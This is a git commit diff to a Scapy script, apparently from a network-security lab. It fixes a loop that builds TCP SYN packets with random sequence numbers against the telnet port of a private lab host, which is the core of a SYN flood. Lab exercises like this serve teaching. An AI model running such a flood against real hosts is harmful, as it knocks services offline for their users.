b487ce159492b2fb709c50f110348c8615a426b8
Conn <M64200@NGC.AUTHORITY>
2023-03-28 15:31:19 -0400

    Update task1.py

--- src/task1.py
+++ src/task1.py
@@ -7,17 +7,17 @@ strSourceIP = "10.9.0.1"
 intSourcePort = randrange(1, 65535)  # Pick an arbirtrary source port number
 
 strDestinationIP = "10.9.0.6"
-strDestinationPort =  23  # Targeting telnet port
+intDestinationPort =  23  # Targeting telnet port
 
 # IP information will not change
-ip_layer = IP(src=strSourceIP, dst=strDestinationIP)
+lyrIP = IP(src=strSourceIP, dst=strDestinationIP)
 
-while true:  # Run until CTRL+C
+while True:  # Run until CTRL+C
     
     # Build the packet with a random sequence index
-    intSequenceIndex = randrange(1, 99999999999)  # Use an arbitrarily random number for sequence number
-    tcp_layer = TCP(sport=intSourcePort, dport=intDestinationPort, flags="S", seq=intSequenceIndex)
-    pktSynPacket = IPLayer / TCPLayer
+    intSequenceIndex = randrange(1, 4294967295)  # Use an arbitrarily random number for sequence number
+    lyrTCP = TCP(sport=intSourcePort, dport=intDestinationPort, flags="S", seq=intSequenceIndex)
+    pktSynPacket = lyrIP / lyrTCP
     
     # Show the information of the packet before sending
     pktSynPacket.show()
